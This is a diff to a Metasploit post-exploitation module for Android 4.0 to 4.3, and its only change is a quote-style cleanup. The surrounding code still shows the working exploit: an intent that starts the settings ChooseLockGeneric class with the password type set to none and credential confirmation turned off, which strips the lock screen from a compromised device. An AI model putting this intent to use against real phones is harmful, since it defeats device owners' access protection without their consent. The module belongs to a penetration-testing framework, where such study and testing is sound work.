@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Post
       update_info(
         info,
         {
-          'Name' => "Android Settings Remove Device Locks (4.0-4.3)",
+          'Name' => 'Android Settings Remove Device Locks (4.0-4.3)',
           'Description' => %q{
             This module exploits a bug in the Android 4.0 to 4.3 com.android.settings.ChooseLockGeneric class.
             Any unprivileged app can exploit this vulnerability to remove the lockscreen.
@@ -67,14 +67,14 @@ class MetasploitModule < Msf::Post
 
   def run
     unless is_version_compat?
-      print_error("This module is only compatible with Android versions 4.0 to 4.3")
+      print_error('This module is only compatible with Android versions 4.0 to 4.3')
       return
     end
 
     result = session.android.activity_start('intent:#Intent;launchFlags=0x8000;component=com.android.settings/.ChooseLockGeneric;i.lockscreen.password_type=0;B.confirm_credentials=false;end')
     if result.nil?
-      print_good("Intent started, the lock screen should now be a dud.")
-      print_good("Go ahead and manually swipe or provide any pin/password/pattern to continue.")
+      print_good('Intent started, the lock screen should now be a dud.')
+      print_good('Go ahead and manually swipe or provide any pin/password/pattern to continue.')
     else
       print_error("The Intent could not be started: #{result}")
     end
